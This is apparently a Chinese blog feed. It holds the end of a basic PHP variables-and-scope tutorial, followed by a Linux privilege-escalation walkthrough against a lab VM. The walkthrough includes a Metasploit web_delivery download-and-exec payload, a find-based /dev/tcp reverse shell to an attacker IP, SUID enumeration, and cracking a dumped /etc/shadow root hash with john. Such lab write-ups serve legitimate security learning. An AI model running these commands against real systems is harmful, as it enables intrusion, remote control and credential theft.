返回用户名称</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getUserName</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$userID</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// 函数实现</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>在实际的 PHP 编程中，合理地使用注释可以使代码更容易理解和维护。但是也要注意不要过度注释，尤其是对于自解释性强的代码</p>\n<h3 id=\"php中的变量\"><a class=\"markdownIt-Anchor\" href=\"#php中的变量\">#</a> <mark>php 中的变量</mark></h3>\n<p>PHP 中的变量是用来存储信息的容器。在 PHP 中，变量的使用有几个关键特点和规则：</p>\n<h4 id=\"变量的定义\"><a class=\"markdownIt-Anchor\" href=\"#变量的定义\">#</a> <mark>变量的定义</mark></h4>\n<ul>\n<li>PHP 中的变量以美元符号  <code>$</code>  开始，后面跟变量的名称。</li>\n<li>变量名称必须以字母或下划线开始，后面可以跟字母、数字或下划线。</li>\n<li>PHP 变量名称区分大小写。</li>\n</ul>\n<h4 id=\"变量赋值\"><a class=\"markdownIt-Anchor\" href=\"#变量赋值\">#</a> <mark>变量赋值</mark></h4>\n<ul>\n<li>使用等号  <code>=</code>  来为变量赋值。</li>\n<li>PHP 是一种弱类型语言，不需要声明变量的类型。变量的类型由它的值决定。</li>\n</ul>\n<p>示例 :</p>\n<pre><code>&lt;?php\n$text = &quot;Hello 你好&quot;;  // 字符串类型\n$number = 9999;          // 整型\n$float = 12.34;         // 浮点型\n$bool = true;           // 布尔型\n$array = array('zxc', 'vbn', 'bnm'); // 数组\necho &quot;变量text为：$text&quot;;\necho &quot;变量number为：$number&quot;;\necho &quot;变量为float：$float&quot;;\nvar_dump($array);\n?&gt;\n</code></pre>\n<p>页面显示</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/php/image-20231116163846928.png\" alt=\"image-20231116163846928\"></p>\n<div class=\"note primary\">\n<p>PHP 是一种动态类型语言。这意味着同一个变量可以用来存储不同类型的数据：</p>\n</div>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">//x 是一个整数</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Sally\"</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 现在 x 是一个字符串</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h4 id=\"变量作用域\"><a class=\"markdownIt-Anchor\" href=\"#变量作用域\">#</a> <mark>变量作用域</mark></h4>\n<ul>\n<li>在 PHP 中，变量的作用域可以是局部的、全局的或静态的。</li>\n<li>局部变量仅在函数内部有效。</li>\n<li>全局变量在脚本的任何部分都有效，但在函数内部需要用   <code>global</code>  关键字来访问。</li>\n<li>静态变量当函数执行完毕后不会被删除，而是保持其值。</li>\n</ul>\n<div class=\"note info\">\n<p>局部作用域（Local）</p>\n</div>\n<ul>\n<li>局部变量仅在函数内部声明和访问。</li>\n<li>函数外部无法访问函数内部的局部变量。</li>\n<li>每当函数执行时，局部变量都会被创建，函数执行结束时，局部变量会被销毁。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!-- 局部作用域 --></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">myTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 局部作用域</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">myTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出 5</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 使用这行将会产生错误，因为 $x 在函数外部是不可用的</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"note info\">\n<p>全局作用域（Global）</p>\n</div>\n<ul>\n<li>在函数外部声明的变量拥有全局作用域。</li>\n<li>全局变量在函数外部可以访问，但默认情况下在函数内部是无法访问的。</li>\n<li>要在一个函数内部访问一个全局变量，需要使用   <code>global</code>  关键字。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 全局作用域</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">my</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">global</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//global 引用全局变量 $x</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">my</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出 5</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出 5</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><ul>\n<li>另一种访问全局变量的方法是使用   <code>$GLOBALS[index]</code>  数组。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$y</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">my</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'y'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">myTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出 10</span></pre></td></tr></table></figure><div class=\"note info\">\n<p>静态作用域（Static）</p>\n</div>\n<ul>\n<li>使用   <code>static</code>  关键字时，函数内的局部变量在函数调用完成后不会被删除。</li>\n<li>静态变量仅在局部函数作用域内存在，但它们不会在函数调用之间丢失其值。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$x</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出 0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出 1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出 2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"note info\">\n<p>参数作用域（Function arguments）</p>\n</div>\n<ul>\n<li>函数参数（在函数调用时传递给函数的变量）具有自己的作用域。</li>\n<li>只有在函数内部，参数才是可用的。</li>\n</ul>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">vvv</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// $x 是一个参数</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">vvv</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出 5</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>理解这些不同的作用域对于编写可靠和可维护的 PHP 代码非常重要。不恰当的作用域使用可能导致难以跟踪的错误和安全问题。</p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/",
            "url": "http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/",
            "title": "linux提权",
            "date_published": "2023-11-10T09:52:23.000Z",
            "content_html": "<h3 id=\"信息收集命令\"><a class=\"markdownIt-Anchor\" href=\"#信息收集命令\">#</a> 信息收集命令</h3>\n<h4 id=\"系统信息\"><a class=\"markdownIt-Anchor\" href=\"#系统信息\">#</a> 系统信息</h4>\n<ul>\n<li><strong> <code>uname -a</code> </strong>: 显示内核、操作系统和 CPU 信息。</li>\n<li><strong> <code>head -n 1 /etc/issue</code> </strong>: 显示操作系统版本。</li>\n<li><strong> <code>cat /proc/version</code> </strong>: 显示系统信息。</li>\n<li><strong> <code>hostname</code> </strong>: 显示计算机名。</li>\n<li><strong> <code>env</code> </strong>: 显示环境变量。</li>\n</ul>\n<h4 id=\"网络信息\"><a class=\"markdownIt-Anchor\" href=\"#网络信息\">#</a> 网络信息</h4>\n<ul>\n<li><strong> <code>ifconfig</code> </strong>: 显示网络接口信息（现在更常用的是 <code>ip addr show</code> ）。</li>\n<li><strong> <code>netstat -lntp</code> </strong>: 显示所有监听端口。</li>\n<li><strong> <code>netstat -antp</code> </strong>: 显示所有已建立的连接。</li>\n<li><strong> <code>netstat -s</code> </strong>: 显示网络统计信息。</li>\n<li><strong> <code>iptables -L</code> </strong>: 显示防火墙设置。</li>\n<li><strong> <code>route -n</code> </strong>: 显示路由表。</li>\n</ul>\n<h4 id=\"用户组信息系统服务\"><a class=\"markdownIt-Anchor\" href=\"#用户组信息系统服务\">#</a> 用户组信息系统服务</h4>\n<ul>\n<li><strong> <code>w</code> </strong>：显示活动用户和他们正在使用的终端等信息。</li>\n<li><strong> <code>id [username]</code> </strong>：显示指定用户的信息，包括用户 ID（UID）、所属用户组等。</li>\n<li><strong> <code>last</code> </strong>：显示用户登录的历史记录，包括登录时间和来源。</li>\n<li><strong> <code>cut -d: -f1 /etc/passwd</code> </strong>：显示系统上所有用户的用户名。</li>\n<li><strong> <code>cut -d: -f1 /etc/group</code> </strong>：显示系统上所有组的组名。</li>\n<li><strong> <code>crontab -l</code> </strong>：显示当前用户的计划任务（定时任务）。</li>\n<li><strong> <code>chkconfig --list</code> </strong>：列出所有系统服务。</li>\n<li><strong> <code>chkconfig --list | grep on</code> </strong>：列出所有已启动的系统服务。</li>\n<li><strong> <code>echo $PATH</code> </strong>：显示系统的路径列表，用冒号分隔的目录列表表示系统在搜索可执行文件时的顺序。</li>\n</ul>\n<h4 id=\"信息收集\"><a class=\"markdownIt-Anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p><code>nmap -sT 192.168.244.0/24</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121190515553.png\" alt=\"\"></p>\n<p>访问 80 没啥东西扫一下目录</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121190852090.png\" alt=\"image-20231121190852090\"></p>\n<p>扫到一个 shell.php</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191144694.png\" alt=\"image-20231121191144694\"></p>\n<h4 id=\"反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>参数是 cmd 可以执行命令</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191211218.png\" alt=\"image-20231121191211218\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191300474.png\" alt=\"image-20231121191300474\"></p>\n<p><code>msf script/web_delivery模块 反弹shell</code></p>\n<p><code>use exploit/multi/script/web_delivery </code></p>\n<p><code>set lhost 192.168.244.128</code></p>\n<p><code>set lport 9000</code></p>\n<p><code>run</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191557311.png\" alt=\"image-20231121191557311\"></p>\n<p>复制 payload 并且 url 编码添加在 cmd 参数后面执行得到 shell</p>\n<p><code>python%20-c%20%22import%20sys%3Bimport%20ssl%3Bu%3D__import__('urllib'%2B%7B2%3A''%2C3%3A'.request'%7D%5Bsys.version_info%5B0%5D%5D%2Cfromlist%3D('urlopen'%2C))%3Br%3Du.urlopen('http%3A%2F%2F192.168.244.128%3A8080%2FsZTvRL2bM'%2C%20context%3Dssl._create_unverified_context())%3Bexec(r.read())%3B%22</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121191810361.png\" alt=\"image-20231121191810361\"></p>\n<h4 id=\"主机信息收集\"><a class=\"markdownIt-Anchor\" href=\"#主机信息收集\">#</a> 主机信息收集</h4>\n<p>先拿一个交互 shell</p>\n<p><code>**python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'**</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20231121192112964.png\" alt=\"image-20231121192112964\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>显示内核、操作系统和CPU信息</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Linux osboxes <span class=\"token number\">4.15</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">45</span><span class=\"token operator\">-</span>generic <span class=\"token comment\">#48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>操作系统版本</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Linux Lite <span class=\"token number\">4.4</span> LTS \\n \\l</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>显示系统信息</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Linux version <span class=\"token number\">4.15</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span><span class=\"token number\">45</span><span class=\"token operator\">-</span>generic <span class=\"token punctuation\">(</span>buildd@lgw01<span class=\"token operator\">-</span>amd64<span class=\"token operator\">-</span><span class=\"token number\">031</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>gcc version <span class=\"token number\">7.3</span><span class=\"token number\">.0</span> <span class=\"token punctuation\">(</span>Ubuntu <span class=\"token number\">7.3</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span>16ubuntu3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>环境变量</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>env</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>APACHE_LOG_DIR<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>log<span class=\"token operator\">/</span>apache2</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>LANG<span class=\"token operator\">=</span>C</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>INVOCATION_ID<span class=\"token operator\">=</span>15ecc432bc2940368927675d4ac3a3a3</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>APACHE_LOCK_DIR<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>lock<span class=\"token operator\">/</span>apache2</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>PWD<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>html</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>JOURNAL_STREAM<span class=\"token operator\">=</span><span class=\"token number\">9</span><span class=\"token punctuation\">:</span><span class=\"token number\">21980</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>APACHE_RUN_GROUP<span class=\"token operator\">=</span>user6</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>APACHE_RUN_DIR<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>run<span class=\"token operator\">/</span>apache2</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>APACHE_RUN_USER<span class=\"token operator\">=</span>user6</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>APACHE_PID_FILE<span class=\"token operator\">=</span><span class=\"token operator\">/</span>var<span class=\"token operator\">/</span>run<span class=\"token operator\">/</span>apache2<span class=\"token operator\">/</span>apache2<span class=\"token punctuation\">.</span>pid</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>SHLVL<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>PATH<span class=\"token operator\">=</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token builtin\">bin</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>_<span class=\"token operator\">=</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token operator\">/</span>env</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>计算机名</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>osboxes</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>系统路径列表</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">:</span><span class=\"token operator\">/</span>sbin<span class=\"token punctuation\">:</span><span class=\"token operator\">/</span><span class=\"token builtin\">bin</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>开启的服务</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>mysql 开启</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>用户</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>vboxadd</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>user1</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>user2</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>user3</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>user4</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>statd</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>user5</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>user6</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>mysql</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>user7</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>user8</pre></td></tr></table></figure><h4 id=\"suid提权\"><a class=\"markdownIt-Anchor\" href=\"#suid提权\">#</a> SUID 提权</h4>\n<p>SUID（Set User ID）是一种权限设置，允许用户以文件所有者的权限来执行文件，即使用户自身的权限可能不足以执行该文件。</p>\n<p>在 Unix 或类 Unix 系统中，当一个可执行文件的 SUID 位被设置为 1 时，无论谁执行该文件，都会以该文件的所有者身份执行。这种权限设置通常用于系统文件或程序，以便允许普通用户执行特定的任务或命令，而无需暴露超出其权限范围的访问权限。</p>\n<p><code>find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000-print2&gt;/dev/null find / -user root -perm -4000-exec ls -ldb &#123;&#125; \\;</code></p>\n<p>在 Unix 或 Linux 系统中查找具有 SUID 权限设置的文件。它会搜索整个文件系统 (“/”)，找到具有 SUID 权限设置的文件 (“-perm  -u=s”) 并将它们显示出来。同时，将任何错误消息重定向到 /dev/null，以避免它们显示在屏幕上。</p>\n<p>常见的提权文件</p>\n<p><code>nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</code></p>\n<p>查询到有一个 find</p>\n<p>cd /  cd /tmp 到 tmp 目录</p>\n<p>创建一个文件</p>\n<p>touch 1234</p>\n<p>find 1234 -exec whoami ;</p>\n<p>这个命令的作用是在当前目录下搜索名为 “1234” 的文件或目录，并对找到的每一个执行  <code>whoami</code>  命令。</p>\n<p><code>find</code>  命令用于查找文件和目录， <code>-exec</code>  选项允许在找到的每一个项目上执行特定的命令， <code>\\;</code>  表示命令结束。</p>\n<p>如果在当前目录下存在名为 “1234” 的文件或目录，对于每一个找到的 “1234”， <code>whoami</code>  命令将被执行，显示当前执行命令的用户的用户名。</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240207132333459.png\" alt=\"image-20240207132333459\"></p>\n<p>反弹 shell</p>\n<p><code>find /etc/passwd -exec bash -ip &gt;&amp; /dev/tcp/192.168.244.128/4343 0&gt;&amp;1 \\;</code></p>\n<p>nc 开启监听接收到会话</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240207132540518.png\" alt=\"image-20240207132540518\"></p>\n<h3 id=\"可读shadow文件利用\"><a class=\"markdownIt-Anchor\" href=\"#可读shadow文件利用\">#</a> 可读 shadow 文件利用</h3>\n<p>Shadow 文件的概述:</p>\n<p>Shadow 文件是一个 Linux 系统中存储加密用户密码和其他身份信息，如账号过期时间，密码过期时间，账户锁定和密码最小长度等等的重要文件。</p>\n<p>Shadow 文件位于 /etc/shadow ，只有 root 用户有权限访问它。</p>\n<p>shadow 文件与 passwd 文件的关系：早些版本加密后的密码是保存在 passwd 文件里第二个字段的位置也就是图中 x 的位置</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221212919749.png\" alt=\"image-20240221212919749\"></p>\n<p>但是呢虽然是加密的还是有可能被破解所以加上了 shadow 这个文件而 passwd 文件里的就被替换为了 X 占位，因为 shadow 文件只有 root 用户可以访问所以相对比较安全，不过有时管理员对文件权限错误配置也会导致被拿来恶意利用</p>\n<p>文件格式：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>root:<span class=\"token variable\">$6</span><span class=\"token variable\">$mqjgcFoM</span><span class=\"token variable\">$X</span>/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::</pre></td></tr></table></figure><p>利用条件 shadow 有权查看</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221213805632.png\" alt=\"image-20240221213805632\"></p>\n<p>获取 root 用户信息并保存在新建文件中</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221213918116.png\" alt=\"image-20240221213918116\"></p>\n<p>root:<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>6</mn></mrow><annotation encoding=\"application/x-tex\">6</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6444em;\"></span><span class=\"mord\">6</span></span></span></span>mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::</p>\n<p>利用工具 john 来破解</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221220225042.png\" alt=\"image-20240221220225042\"></p>\n<p>得到明文密码就可以切换 root 了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/linux%E6%8F%90%E6%9D%83/image-20240221220330572.png\" 